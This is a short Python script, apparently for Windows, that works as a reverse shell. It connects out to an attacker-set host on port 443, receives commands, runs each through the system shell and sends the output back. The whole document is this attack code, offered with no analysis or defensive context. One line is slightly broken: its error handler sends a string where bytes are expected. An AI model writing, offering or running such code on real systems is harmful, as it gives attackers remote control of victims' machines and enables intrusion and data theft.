# Windows
import socket as s
import subprocess as sp

LHOST = 'IP_ADDRESS'
LPORT = 443
BUFFERR_SIZE = 1024

client = s.socket(s.AF_INET, s.SOCK_STREAM)
client.connect((LHOST, LPORT))

while True:
    try:
        data = client.recv(BUFFERR_SIZE)
        if not data:
            break

        command = data.decode("utf-8").strip()

        if len(command) >= 0:
            try:
                output = sp.check_output(command, shell=True, stderr=sp.STDOUT)
            except sp.CalledProcessError as error:
                output = error.output

            client.send(output)
    except Exception as error:
        client.send(f"error {error}")
client.close()
